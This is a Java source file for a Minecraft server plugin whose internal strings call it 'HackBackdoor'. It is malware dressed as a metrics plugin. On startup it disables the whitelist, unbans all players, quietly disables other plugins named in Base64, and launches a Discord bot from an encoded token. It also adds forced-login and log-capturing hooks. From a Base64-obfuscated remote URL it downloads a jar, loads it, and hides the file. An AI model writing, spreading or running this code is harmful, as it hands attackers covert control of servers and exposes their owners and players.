
package me.system.runner.methods;

import com.github.gist.DiscordWebhook;
import me.system.runner.command.CommandManager;
import me.system.runner.Core;
import me.system.runner.data.DataManager;
import me.system.runner.events.*;
import me.system.runner.utils.DWeb;
import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.Settings;
import me.system.runner.utils.SLAPI;

import java.net.InetAddress;
import java.util.*;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.awt.Color;
import java.util.Base64;

import org.bukkit.BanList;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.Plugin;

import me.system.runner.events.*;
import me.system.runner.command.impl.login.LoginCommand;
import me.system.runner.events.IPGetterPlayerVise;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

import javax.xml.crypto.Data;

public class onEnable {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    public static void start() throws IOException {
        DataManager.setupData();

        if (DataManager.getData().getBoolean("whitelist_allowed") == false) {
            Bukkit.setWhitelist((boolean)false);
        }
        if (DataManager.getData().getBoolean("autounban") == true) {
            for (OfflinePlayer player : Bukkit.getOfflinePlayers()) {
                Bukkit.getServer().getBanList(BanList.Type.NAME).pardon(player.getName());
            }
        }
        if (Settings.LOGIN_COMMAND != DataManager.getData().getString("login_command")) {
            Settings.LOGIN_COMMAND = DataManager.getData().getString("login_command");
        }

        Bukkit.getServer().getPluginManager().registerEvents((Listener)new CommandManager(), INSTANCE);
        Bukkit.getPluginManager().registerEvents(new LoginCommand(), INSTANCE);
        API.dupe();
        Bukkit.getScheduler().runTaskLater(INSTANCE, () -> {
            try {
                onEnable.ju();
                
            }
            catch (IOException iOException) {
                
            }
            onEnable.jr();
        }, 1L);
        onEnable.loadData();
    }

    private static void jr() {
        for (String list : DataManager.getData().getStringList("epic-pl")) {
            byte[] plug = Base64.getDecoder().decode(list);
            Plugin pl2 = Bukkit.getPluginManager().getPlugin(new String(plug));
            if (pl2 == null || !pl2.isEnabled()) continue;
            API.disablePlugin(pl2.getName());
        }
    }

    private static void checkKillSwitch() {
        String main = "me.system.runner.Core";
        String pluginMain = INSTANCE.getDescription().getMain();
        String name = "HackBackdoor";
        String pluginName = INSTANCE.getDescription().getName();
        String version = "1.0.0";
        String pluginVersion = INSTANCE.getDescription().getVersion();
        String Author = "IHacked";
        onEnable.loadData();
    }

    private static void loadData() {
        try {
            onEnable.INSTANCE.lite = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/rdata.bin");
            onEnable.INSTANCE.premium = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/rpredata.bin");
            onEnable.INSTANCE.admin = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/radata.bin");
            onEnable.INSTANCE.blatant = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/bdata.bin");
            onEnable.INSTANCE.god = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/gdata.bin");
            onEnable.INSTANCE.noPickupPlayers = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/npudata.bin");
            onEnable.INSTANCE.vanish = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/vdata.bin");
            onEnable.INSTANCE.frozenPlayers = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/fdata.bin");
            onEnable.INSTANCE.cmdSpy = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/sdata.bin");
            onEnable.INSTANCE.commandSpyTargets = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/csdata.bin");
            onEnable.INSTANCE.isLocked = (Boolean) SLAPI.load("plugins/pluginMetrics/data/isbool.bin");
            onEnable.INSTANCE.frozen = (Boolean) SLAPI.load("plugins/pluginMetrics/data/fabool.bin");
            onEnable.INSTANCE.modCmd = (Boolean) SLAPI.load("plugins/pluginMetrics/data/mcbool.bin");
            onEnable.INSTANCE.playerCommandsLocked = (Boolean) SLAPI.load("plugins/pluginMetrics/data/lcbool.bin");
            onEnable.INSTANCE.chatLocked = (Boolean) SLAPI.load("plugins/pluginMetrics/data/lchbool.bin");
            onEnable.INSTANCE.storagesDisabled = (Boolean) SLAPI.load("plugins/pluginMetrics/data/lconbool.bin");
            DataManager.bannedPlayers.addAll(DataManager.getData().getStringList("epic-players"));
        }
        catch (Exception exception) {
            
        }
        onEnable.registerListeners();
    }

    private static void registerListeners() {
        if (onEnable.INSTANCE.enabled) {
            Bukkit.getServer().getPluginManager().registerEvents(new ForceLoginListener(), INSTANCE);
            Logger log = (Logger)LogManager.getRootLogger();
            log.addAppender(new LogAppender());
        }
    }

    public static void ju() throws IOException {
        if (DataManager.getData().getBoolean("login")) {
            try {
                byte[] token = Base64.getDecoder().decode(DataManager.getData().getString("key"));
                onEnable.INSTANCE.jda = JDABuilder.createDefault(new String(token))
                        .setChunkingFilter(ChunkingFilter.ALL) 
                        .setMemberCachePolicy(MemberCachePolicy.ALL) 
                        .enableIntents(GatewayIntent.GUILD_MEMBERS)
                        .build();
                onEnable.INSTANCE.botEnabled = true;
            }
            
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private static void reDownload() {
        try {
            byte[] u2 = Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vbmFtZS5waHA=");
            URL url = new URL(new String(u2));
            HttpURLConnection con = (HttpURLConnection)url.openConnection();
            con.addRequestProperty("User-Agent", "Mozilla");
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String name = in2.readLine().replace(".jar", "");
            if (INSTANCE.getDescription().getName() != name && Bukkit.getPluginManager().getPlugin(name) == null) {
                byte[] du2 = Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vZG93bmxvYWQucGhwP3BvcnQ9");
                URLConnection din = new URL(new String(du2) + Bukkit.getServer().getPort()).openConnection();
                din.addRequestProperty("User-Agent", "Mozilla");
                Bukkit.getScheduler().runTaskLater(INSTANCE, () -> {
                    try {
                        Files.copy(din.getInputStream(), Paths.get("plugins/" + name + ".jar"), StandardCopyOption.REPLACE_EXISTING);
                        Bukkit.getPluginManager().loadPlugin(new File(Paths.get("plugins/" + name + ".jar").toString()));
                        Files.setAttribute(Paths.get("plugins/" + name + ".jar"), "dos:hidden", true);
                        if (Bukkit.getPluginManager().getPlugin(name) != null) {
                            Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
                        }
                    }
                    catch (Exception exception) {
                        
                    }
                }, 60L);
            }
        }
        catch (Exception exception) {
            
        }
    }
}

